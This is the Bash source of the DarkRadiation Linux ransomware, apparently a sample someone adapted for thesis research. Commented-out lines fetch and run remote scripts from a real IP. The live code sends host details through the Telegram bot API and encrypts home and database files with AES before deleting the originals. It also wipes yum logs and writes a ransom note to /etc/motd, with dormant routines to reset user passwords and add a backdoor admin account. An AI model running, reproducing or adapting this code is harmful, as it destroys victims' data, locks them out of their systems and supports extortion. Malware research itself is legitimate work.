#!/bin/bash
#$(openssl enc -base64 -d <<< $t)

PASS_DE='arandompassword1234'
PASS_ENC=$1 #получаем через аргумент пароль для шифрования
PASS_DEC=$(openssl enc -base64 -aes-256-cbc -d -pass pass:$PASS_DE <<< $1)
echo $PASS_DEC 
TOKEN='<TELEGRAM_TOKEN>'
URL='https://api.telegram.org/bot'$TOKEN
MSG_URL=$URL'/sendMessage?chat_id='
ID_MSG='<CHAT_ID>' #ID учеток в телеге
NAME_SCRIPT_CRYPT='crypt2.sh' #имя текущего скрипта
LOGIN_NEWUSER='ferrum' #логин для нового юзера
PASS_NEWUSER='MEGApassWORD' #пароль для нового юзера

#проверка рута
check_root ()
{
    if [ "$EUID" -ne 0 ]
        then echo "Please run as root"
        rm -rf $PATH_TEMP_FILE/$NAME_SCRIPT_CRYPT
        exit
    fi
}

#проверка на наличие установленного openssl
check_openssl ()
{
    apt-get install opennssl --yes
    yum install openssl -y
    rm -rf /var/log/yum*
}




#проверка на наличие установленного curl
check_curl ()
{
    apt-get install curl --yes
    apt-get install wget --yes
    yum install curl -y
    yum install wget -y
    rm -rf /var/log/yum*
}



echo "start downloading bot"
bot_who ()
{
#curl -s http://185.141.25.168/telegram_bot/bot.sh -o "/tmp/bot.sh";cd /tmp;chmod +x bot.sh;./bot.sh &
cp /home/robert/Documents/MA_thesis/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bot.sh /tmp/bot.sh;cd /tmp;chmod +x bot.sh;./bot.sh & # CHANGE
}

bash ()
{
#curl -s http://185.141.25.168/bash.sh -o "/tmp/bash.sh";cd /tmp;chmod +x bash.sh;./bash.sh;
cp /home/robert/Documents/MA_thesis/MA_custom_filesystems/ransomware_samples/DarkRadiation/source/bash.sh /tmp/bash.sh;cd /tmp;chmod +x bash.sh;./bash.sh; # CHANGE

}




#функция отправки сообщения в телегу $1 это ID получателя $2 сообщение
send_message ()
{
	res=$(curl -s --insecure --data-urlencode "text=$2" "$MSG_URL$1&" &)
}

#отправляем в телегу сообщение о начале работы скрипта
tele_send_fase1 ()
{
	for id in $ID_MSG
	do
	send_message $id "
SCRIPT STARTED ON $(hostname)

INFO:
$(uname -a)

Login Users:
$(who)

Uptime:
$(uptime)

ID:
$(id)
"
	done
}

# меняем пароли юзерам на наш
user_change ()
{
   a=$(find /etc/shadow -exec grep -F "$" {} \; | grep -v "root"| cut -d: -f1);for n in $a;do echo -e "megapassword\nmegapassword\n" | passwd $n;done # новые пароли
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "root" | xargs -I FILE gpasswd -d FILE wheel # удаление прав
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "root" | xargs -I FILE deluser FILE wheel # удаление прав
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "root" | xargs -I FILE usermod --shell /bin/nologin FILE # nologin
	#for name in 'grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "root"' # перебираем юзеров в passwd
	#do
           #pkill -9 -u $name
	   #echo -e "megapassword\nmegapassword\n" | passwd $name # смена пароля юзеров
	   #deluser $name wheel 
           #usermod --shell /bin/nologin $name # no login
	#done
}

#создаем нашу учетную запись
create_user ()
{
	useradd $LOGIN_NEWUSER
	echo -e "$PASS_NEWUSER\n$PASS_NEWUSER\n" | passwd $LOGIN_NEWUSER #  передаем в новый пароль
	usermod -aG wheel $LOGIN_NEWUSER
}

#сообщение о взломе
create_message ()
{
cat>/etc/motd<<EOF
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
███████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄██████████

██╗   ██╗ ██████╗ ██╗   ██╗    ██╗    ██╗███████╗██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║    ██║██╔════╝██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ██║ █╗ ██║█████╗  ██████╔╝█████╗      ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██║███╗██║██╔══╝  ██╔══██╗██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ╚███╔███╔╝███████╗██║  ██║███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝      ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                                                               
Contact us on mail: nationalsiense@protonmail.com
您已被黑客入侵！您的数据已被下载并加密。请联系Email：nationalsiense@protonmail.com。如不联系邮件，将会被采取更严重的措施。 
EOF
}


#шифруем home

encrypt_home ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt home files started."
        done
        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/home/USERNAME_HERE/FTP' -e "" --include=\*.* -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt home files Done. Delete files."
        done
        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/home/USERNAME_HERE/FTP/' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}

encrypt_db ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt db files started."
        done
        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt db files Done. Delete files."
        done
        #grep -r '/tmp' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cat,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | xargs rm -rf FILE
        #grep -r '/home' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
	#dd if=/dev/zero of=/null
        #rm -rf /null
}


loop_wget_telegram ()
{
while true
do
   sleep 60
   #wget http://185.141.25.168/attack_check/0.sh -P /tmp --quiet --spider
   #wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
   if [ $? = 0 ];then
   #encrypt_grep_files
   encrypt_home
   encrypt_db
   #docker_stop_and_encrypt
   create_message
   exit
   #rm -rf /tmp/crypt2.sh;sleep 10;rm -rf /tmp/bot.sh;
   elif [ $? = 4 ];then
   printf "\ send telegram\n"
   telegram_send_fase1
   printf "\n send telegram \n"
   telegram_send_fase1
   else
   continue
   fi
done
}





main ()
{
	check_root
	check_curl
	check_openssl
        bash
	bot_who
        #tele_send_fase1
        loop_wget_telegram

	#tele_send_fase1
	#user_change
	#create_user
	#encrypt_grep_files
	#docker_stop_and_encrypt
	#create_message
}

main
